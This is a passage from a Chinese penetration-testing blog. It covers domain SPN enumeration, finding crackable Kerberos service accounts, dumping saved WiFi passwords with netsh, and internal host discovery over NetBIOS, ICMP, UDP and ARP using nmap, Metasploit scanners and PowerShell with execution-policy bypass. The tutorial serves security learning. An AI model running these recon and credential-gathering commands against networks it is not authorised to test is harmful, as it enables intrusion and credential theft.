<span class="token string">"*"</span> <span class="token operator">-</span><span class="token class-name">List</span> yes <span class="token operator">|</span> <span class="token class-name">Format</span><span class="token operator">-</span><span class="token class-name">Table</span></pre></td></tr><tr><td data-num="5"></td><td><pre>#<span class="token class-name">Powershellery</span><span class="token operator">/</span><span class="token class-name">Stable</span><span class="token operator">-</span>ish<span class="token operator">/</span>ADS<span class="token operator">/</span> 下<span class="token class-name">Get</span><span class="token operator">-</span><span class="token class-name">DomainSpn</span><span class="token punctuation">.</span>psm1脚本的使用</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token class-name">Import</span><span class="token operator">-</span><span class="token class-name">Module</span> <span class="token punctuation">.</span>\<span class="token class-name">Get</span><span class="token operator">-</span><span class="token class-name">DomainSpn</span><span class="token punctuation">.</span>psm1</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token class-name">Get</span><span class="token operator">-</span><span class="token class-name">DomainSpn</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205627963-508257973.png" alt="image" /></p>
<h4 id="riskyspn中的find-potentiallycrackableaccountsps1"><a class="anchor" href="#riskyspn中的find-potentiallycrackableaccountsps1">#</a> RiskySPN 中的 Find-PotentiallyCrackableAccounts.ps1：</h4>
<p>该脚本可以帮助我们自动识别弱服务票据，主要作用是对属于用户的可用服务票据执行审计，并根据用户帐户和密码过期时限来查找最容易包含弱密码的票据。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20vc3RlbW1tL1BMdG9vbHMvYmxvYi9tYWluL0ZpbmQtUG90ZW50aWFsbHlDcmFja2FibGVBY2NvdW50cy5wczE=">项目地址</span></p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">Import</span><span class="token operator">-</span><span class="token class-name">Module</span> <span class="token punctuation">.</span>\<span class="token class-name">Find</span><span class="token operator">-</span><span class="token class-name">PotentiallyCrackableAccounts</span><span class="token punctuation">.</span>ps1<span class="token punctuation">;</span><span class="token class-name">Find</span><span class="token operator">-</span><span class="token class-name">PotentiallyCrackableAccounts</span> <span class="token operator">-</span><span class="token class-name">FullData</span> <span class="token operator">-</span><span class="token class-name">Verbose</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205650600-2009275168.png" alt="image" /></p>
<p>该脚本将提供比 klist 和 Mimikatz 更详细的输出，包括组信息，密码有效期和破解窗口。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205657811-1827696194.png" alt="image" /></p>
<p>使用 domain 参数，将返回所有具有关联服务主体名称的用户帐户，也就是将返回所有 SPN 注册在域用户下的用户。</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">Import</span><span class="token operator">-</span><span class="token class-name">Module</span> <span class="token punctuation">.</span>\<span class="token class-name">Find</span><span class="token operator">-</span><span class="token class-name">PotentiallyCrackableAccounts</span><span class="token punctuation">.</span>ps1<span class="token punctuation">;</span><span class="token class-name">Find</span><span class="token operator">-</span><span class="token class-name">PotentiallyCrackableAccounts</span> <span class="token operator">-</span><span class="token class-name">Domain</span> <span class="token string">"xie.com"</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205708529-1090185347.png" alt="image" /></p>
<h2 id="cmd命令查看wifi密码"><a class="anchor" href="#cmd命令查看wifi密码">#</a> CMD 命令查看 WiFi 密码</h2>
<h3 id="cmd命令查看wifi密码-2"><a class="anchor" href="#cmd命令查看wifi密码-2">#</a> CMD 命令查看 WiFi 密码</h3>
<p>使用 CMD 命令查看 WiFi 密码</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>运行<span class="token constant">CMD</span>（命令提示符） （确保无线网卡启用状态）</pre></td></tr><tr><td data-num="2"></td><td><pre>输入命令查看WiFi配置文件：</pre></td></tr></table></figure><p>使用命令：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre># 列出所有连接过的WiFi的配置文件  </pre></td></tr><tr><td data-num="2"></td><td><pre>netsh wlan show profiles</pre></td></tr><tr><td data-num="3"></td><td><pre># 查看到某个具体WiFi的配置详情，包括密码：</pre></td></tr><tr><td data-num="4"></td><td><pre>netsh wlan show profiles name<span class="token operator">=</span><span class="token string">"XXXXXX"</span> key<span class="token operator">=</span>clear</pre></td></tr><tr><td data-num="5"></td><td><pre># <span class="token constant">XXXXXX</span> 代替自己的WiFi名称即可</pre></td></tr></table></figure><p>示例：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>netsh wlan show profiles name<span class="token operator">=</span><span class="token string">"21r000"</span> key<span class="token operator">=</span>clear</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205727861-452665486.png" alt="image" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205736926-1649647880.png" alt="image" /></p>
<p>即可看到 WiFi 密码。</p>
<h3 id="图形界面查看wifi密码"><a class="anchor" href="#图形界面查看wifi密码">#</a> 图形界面查看 WiFi 密码</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205808942-1338487961.png" alt="image" /></p>
<p>双击后点击 “无限属性” 进入 “安全” 目录显示字符即可查看 WiFi 密码。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205814658-555281974.png" alt="image" /></p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>emmmmm，杰哥不要啊！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205825191-1202434293.jpg" alt="image" /></p>
<p>参考链接：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvTEYxMGtEdUlrMmw4R3d1LUNhazhLQQ==">内网渗透（一） | 域渗透之 SPN 服务主体名称</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3OTE2MTgzL2FydGljbGUvZGV0YWlscy8xMDA4NTk2MzU=">CMD 命令查看 WiFi 密码</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>windows信息搜集篇（四）之内网存活主机探测的多种方式</title>
    <url>/article/85cc03e0.html</url>
    <content><![CDATA[<p>话不多说，直接开始吧，头已经大了！</p>
<h1 id="00x01-netbios协议探测"><a class="anchor" href="#00x01-netbios协议探测">#</a> 00x01 Netbios 协议探测</h1>
<h2 id="11-netbios简介"><a class="anchor" href="#11-netbios简介">#</a> 1.1 netbios 简介</h2>
<p><code>IBM</code>  公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口（ <code>API</code> ），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。系统可以利用 <code>WINS</code>  服务、广播及 <code>Lmhost</code>  文件等多种模式将 <code>NetBIOS</code>  名 -—— 特指基于 <code>NETBIOS</code>  协议获得计算机名称 —— 解析为相应 IP 地址，实现信息通讯，所以在局域网内部使用 <code>NetBIOS</code>  协议可以方便地实现消息通信及资源的共享</p>
<h2 id="12-nmap扫描"><a class="anchor" href="#12-nmap扫描">#</a> 1.2 nmap 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>sU <span class="token operator">--</span>script nbstat<span class="token punctuation">.</span>nse <span class="token operator">-</span>p137 <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span><span class="token constant">T4</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206160211983.png" alt="image-20211206160211983" /></p>
<h2 id="13-msf扫描"><a class="anchor" href="#13-msf扫描">#</a> 1.3 msf 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    └─# msfconsole</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206160348269.png" alt="image-20211206160348269" /></p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token operator">></span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname</pre></td></tr><tr><td data-num="2"></td><td><pre>    msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname<span class="token punctuation">)</span> <span class="token operator">></span> show options</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206160506137.png" alt="image-20211206160506137" /></p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname<span class="token punctuation">)</span> <span class="token operator">></span> set RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr><tr><td data-num="2"></td><td><pre>RHOSTS <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr><tr><td data-num="3"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname<span class="token punctuation">)</span> <span class="token operator">></span> run</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206160927298.png" alt="image-20211206160927298" /></p>
<h2 id="14-nbtscan扫描"><a class="anchor" href="#14-nbtscan扫描">#</a> 1.4 nbtscan 扫描</h2>
<p><span class="exturl" data-url="aHR0cDovL3d3dy51bml4d2l6Lm5ldC90b29scy9uYnRzY2FuLmh0bWw=">项目地址</span></p>
<p><strong>Windows:</strong></p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>nbtscan<span class="token punctuation">.</span>exe <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206161354834.png" alt="image-20211206161354834" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nbtstat <span class="token operator">-</span>n</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206161513360.png" alt="image-20211206161513360" /></p>
<p><strong>Linux：</strong></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nbtscan <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206161649372.png" alt="image-20211206161649372" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nbtscan <span class="token operator">-</span>v <span class="token operator">-</span>s<span class="token operator">:</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206161816036.png" alt="image-20211206161816036" /></p>
<h1 id="00x02-icmp协议探测"><a class="anchor" href="#00x02-icmp协议探测">#</a> 00x02 ICMP 协议探测</h1>
<h2 id="21-icmp简介"><a class="anchor" href="#21-icmp简介">#</a> 2.1 ICMP 简介</h2>
<p>它是 <code>TCP/IP</code>  协议族的一个子协议，用于在 <code>IP</code>  主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p>
<h2 id="22-cmd下扫描"><a class="anchor" href="#22-cmd下扫描">#</a> 2.2 CMD 下扫描</h2>
<p>扫描内网 <code>C</code>  段存活主机</p>
<p><code>IP</code>  段改为自己想要扫描的 <code>IP</code>  段即可，视自己情况而定</p>
<p>命令行直显：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token operator">/</span>l <span class="token operator">%</span>i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">do</span> @ ping <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span><span class="token operator">%</span>i <span class="token operator">-</span>w <span class="token number">1</span> <span class="token operator">-</span>n <span class="token number">1</span><span class="token operator">|</span>find <span class="token operator">/</span>i <span class="token string">"ttl="</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206162603807.png" alt="image-20211206162603807" /></p>
<p>输出内容导出：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>@<span class="token keyword">for</span> <span class="token operator">/</span>l <span class="token operator">%</span>i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">do</span> @ping <span class="token operator">-</span>n <span class="token number">1</span> <span class="token operator">-</span>w <span class="token number">40</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span><span class="token operator">%</span>i <span class="token operator">&amp;</span> <span class="token keyword">if</span> errorlevel <span class="token number">1</span> <span class="token punctuation">(</span>echo <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span><span class="token operator">%</span>i<span class="token operator">>></span>c<span class="token operator">:</span>\a<span class="token punctuation">.</span>txt<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token punctuation">(</span>echo <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span><span class="token operator">%</span>i <span class="token operator">>></span>c<span class="token operator">:</span>\b<span class="token punctuation">.</span>txt<span class="token punctuation">)</span></pre></td></tr></table></figure><p>因为要写 <code>C</code>  盘，所以需要管理员权限的 <code>cmd</code>  运行。(导出其他盘符，不需要管理员权限)</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206162831125.png" alt="image-20211206162831125" /></p>
<h2 id="23-nmap扫描"><a class="anchor" href="#23-nmap扫描">#</a> 2.3 nmap 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>sn <span class="token operator">-</span><span class="token constant">PE</span> <span class="token operator">-</span><span class="token constant">T4</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>    #（扫描一个<span class="token constant">C</span>段下的存活主机<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206163058720.png" alt="image-20211206163058720" /></p>
<h2 id="24-powershell扫描"><a class="anchor" href="#24-powershell扫描">#</a> 2.4 powershell 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>powershell<span class="token punctuation">.</span>exe ‐exec bypass ‐Command <span class="token string">"Import‐Module ./Invoke‐TSPingSweep.ps1; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ResolveHost ‐ScanPort ‐Port 445,135"</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/1561366-20191129181950543-864548871.png" alt="img" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">D</span><span class="token operator">:</span>\<span class="token operator">></span>tcping<span class="token punctuation">.</span>exe ‐n <span class="token number">1</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token number">80</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/1561366-20191129182105502-752087539.png" alt="img" /></p>
<h1 id="00x03-udp协议探测"><a class="anchor" href="#00x03-udp协议探测">#</a> 00x03 UDP 协议探测</h1>
<h2 id="31-udp简介"><a class="anchor" href="#31-udp简介">#</a> 3.1 UDP 简介</h2>
<p><code>UDP</code> （ <code>User Datagram Protocol</code> ）是一种无连接的协议，在第四层 - 传输层，处于 <code>IP</code>  协议的上一层。 <code>UDP</code>  有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p>
<h2 id="32-udp显著特性"><a class="anchor" href="#32-udp显著特性">#</a> 3.2 UDP 显著特性</h2>
<p>1. <code>UDP</code>  缺乏可靠性。 <code>UDP</code>  本身不提供确认，超时重传等机制。 <code>UDP</code>  数据报可能在网络中被复制，被重新排序，也不保证每个数据报只到达一次。<br />
2. <code>UDP</code>  数据报是有长度的。每个  <code>UDP</code>  数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而  <code>TCP</code>  是一个字节流协议，没有任何（协议上的）记录边界。<br />
3. <code>UDP</code>  是无连接的。 <code>UDP</code>  客户和服务器之前不必存在长期的关系。大多数的 <code>UDP</code>  实现中都选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的 <code>UDP</code>  数据报<br />
 4. <code>UDP</code>  支持多播和广播。</p>
<h2 id="33-nmap扫描"><a class="anchor" href="#33-nmap扫描">#</a> 3.3 nmap 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# nmap <span class="token operator">-</span>sU <span class="token operator">-</span><span class="token constant">T5</span> <span class="token operator">-</span>sV <span class="token operator">--</span>max<span class="token operator">-</span>retries <span class="token number">1</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span> <span class="token operator">-</span>p <span class="token number">500</span></pre></td></tr></table></figure><p>慢的令人发指，稍微等一下或者另开一个窗口进行下一条命令好了。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206163504037.png" alt="image-20211206163504037" /></p>
<h2 id="34-msf扫描"><a class="anchor" href="#34-msf扫描">#</a> 3.4 msf 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe</pre></td></tr><tr><td data-num="2"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206163442339.png" alt="image-20211206163442339" /></p>
<h2 id="35-unicornscantcp协议扫描工具"><a class="anchor" href="#35-unicornscantcp协议扫描工具">#</a> 3.5 unicornscanTCP 协议扫描工具</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzIxcjAwMC91bmljb3Juc2Nhbg==">项目地址</span></p>
<p><code>linux</code>  下使用推荐</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# unicornscan <span class="token operator">-</span>mU <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span></pre></td></tr></table></figure><h2 id="36-scanline扫描"><a class="anchor" href="#36-scanline扫描">#</a> 3.6 ScanLine 扫描</h2>
<p>推荐 <code>win</code>  下使用，以管理员身份执行。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206170607737.png" alt="image-20211206170607737" /></p>
<h2 id="37-在线"><a class="anchor" href="#37-在线">#</a> 3.7 在线</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9wZW50ZXN0LXRvb2xzLmNvbS9uZXR3b3JrLXZ1bG5lcmFiaWxpdHktc2Nhbm5pbmcvbmV0d29yay1zZWN1cml0eS1zY2FubmVyLW9ubGluZS1vcGVudmFz">在线基于 Nmap 的 udp 扫描</span></p>
<h1 id="00x04-arp协议探测"><a class="anchor" href="#00x04-arp协议探测">#</a> 00x04 ARP 协议探测</h1>
<h2 id="41-arp简介"><a class="anchor" href="#41-arp简介">#</a> 4.1 ARP 简介</h2>
<p><code>ARP</code> , 通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据 <code>IP</code>  地址获取物理地址的一个 <code>TCP/IP</code>  协议。主机发送信息时将包含目标 <code>IP</code>  地址的 <code>ARP</code>  请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址</p>
<h2 id="42-nmap扫描"><a class="anchor" href="#42-nmap扫描">#</a> 4.2 nmap 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# nmap <span class="token operator">-</span>sn <span class="token operator">-</span><span class="token constant">PR</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206170835529.png" alt="image-20211206170835529" /></p>
<h2 id="43-msf扫描"><a class="anchor" href="#43-msf扫描">#</a> 4.3 msf 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep</pre></td></tr></table></figure><h2 id="44-netdiscover"><a class="anchor" href="#44-netdiscover">#</a> 4.4 netdiscover</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# ifconfig #查看本机存在的网卡</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>└─# netdiscover <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span>i <span class="token function">eth0</span><span class="token punctuation">(</span>网卡名称<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206171230132.png" alt="image-20211206171230132" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206171112614.png" alt="image-20211206171112614" /></p>
<h2 id="45-arp-scanlinux"><a class="anchor" href="#45-arp-scanlinux">#</a> 4.5 arp-scan（linux）</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi8xL2FycC1zY2Fu">项目地址</span></p>
<p>新版的 <code>kali</code>  中都自带 <code>arp-scan</code> ，如无内置则需要下载安装：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# apt<span class="token operator">-</span><span class="token keyword">get</span> install arp<span class="token operator">-</span>scan</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206171417370.png" alt="image-20211206171417370" /></p>
<h2 id="46-arp-scanwindows"><a class="anchor" href="#46-arp-scanwindows">#</a> 4.6 arp-scan（windows）</h2>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>arp<span class="token operator">-</span>scan<span class="token punctuation">.</span>exe <span class="token operator">-</span>t <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Fic3VyYW5BbGFuZy9hcnAtc2Nhbi13aW5kb3dzLQ==">（非官方）项目地址</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/1561366-20191129180232418-1064578044.png" alt="img" /></p>
<h2 id="47-powershell"><a class="anchor" href="#47-powershell">#</a> 4.7 Powershell</h2>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>c<span class="token operator">:</span>\tmp<span class="token operator">></span>powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span><span class="token class-name">Command</span> <span class="token string">"Import-Module .\arpscan.ps1;InvokeARPScan -CIDR 192.168.1.0/24"</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/1561366-20191129175859161-294565698.png" alt="img" /></p>
<h1 id="00x05-snmp协议探测"><a class="anchor" href="#00x05-snmp协议探测">#</a> 00x05 SNMP 协议探测</h1>
<h2 id="51-snmp简介"><a class="anchor" href="#51-snmp简介">#</a> 5.1 SNMP 简介</h2>
<p><code>SNMP</code>  是一种简单网络管理协议，它属于 <code>TCP/IP</code>  五层协议中的应用层协议，用于网络管理的协议。 <code>SNMP</code>  主要用于网络设备的管理。 <code>SNMP</code>  协议主要由两大部分构成： <code>SNMP</code>  管理站和 <code>SNMP</code>  代理。 <code>SNMP</code>  管理站是一个中心节点，负责收集维护各个 <code>SNMP</code>  元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而 <code>SNMP</code>  代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与 <code>SNMP</code>  管理站交互，接收并执行管理站的命令，上传各种本地的网络信息。</p>
<h2 id="52-nmap扫描"><a class="anchor" href="#52-nmap扫描">#</a> 5.2 nmap 扫描</h2>
